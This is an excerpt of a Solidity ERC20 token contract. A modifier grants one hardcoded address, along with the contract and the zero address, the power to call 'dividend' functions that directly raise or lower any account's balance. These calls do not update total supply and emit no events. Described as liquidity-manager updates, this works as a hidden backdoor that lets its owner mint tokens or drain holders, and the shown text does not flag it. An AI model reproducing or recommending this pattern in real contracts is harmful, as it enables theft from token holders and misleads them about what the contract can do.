...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    modifier onlyDividendSplitter {
        //DividendSplitter contract address (added dead address for contract deployment)
        require(msg.sender == 0xDbAA17B28019CeA3910f40cf5429b9D40570c898 || msg.sender == address(this)|| msg.sender == address(0x0), "Sender: get out please!");
        _;
    }
    ...
    function updatePosDividend(address account, uint256 amount) public onlyDividendSplitter {
        // Only liquidity manager can call it. For updating purposes
        _balances[account] += amount;
    }
    
    function updateNegDividend(address account, uint256 amount)  public onlyDividendSplitter {
         // Only liquidity manager can call it. For updating purposes
        _balances[account] -= amount;
    }
